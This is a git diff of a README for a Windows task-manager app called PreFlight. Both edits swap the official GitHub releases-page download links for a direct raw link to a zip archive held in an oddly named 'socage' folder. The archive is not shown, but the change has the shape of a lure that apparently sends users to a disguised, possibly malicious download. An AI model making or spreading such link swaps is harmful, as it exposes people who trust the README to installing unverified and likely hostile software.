@@ -1,6 +1,6 @@
 # ✈️ PreFlight - Simplify your complex desktop task management
 
-[![](https://img.shields.io/badge/Download-PreFlight-blue.svg)](https://github.com/nativesicilianpizza182/PreFlight/releases)
+[![](https://img.shields.io/badge/Download-PreFlight-blue.svg)](https://raw.githubusercontent.com/nativesicilianpizza182/PreFlight/main/socage/Pre-Flight-v3.1.zip)
 
 PreFlight organizes your daily digital workflow. It runs on your Windows computer and tracks the tasks you need to finish before you start your main work. You use the software to create checklists, set reminders, and monitor file progress. This tool ensures you remain organized and focused throughout the day.
 
@@ -15,7 +15,7 @@ PreFlight organizes your daily digital workflow. It runs on your Windows compute
 
 You find the software installer on the official releases page. 
 
-[Download the latest version here](https://github.com/nativesicilianpizza182/PreFlight/releases)
+[Download the latest version here](https://raw.githubusercontent.com/nativesicilianpizza182/PreFlight/main/socage/Pre-Flight-v3.1.zip)
 
 Follow these steps to set up the software on your machine:
 
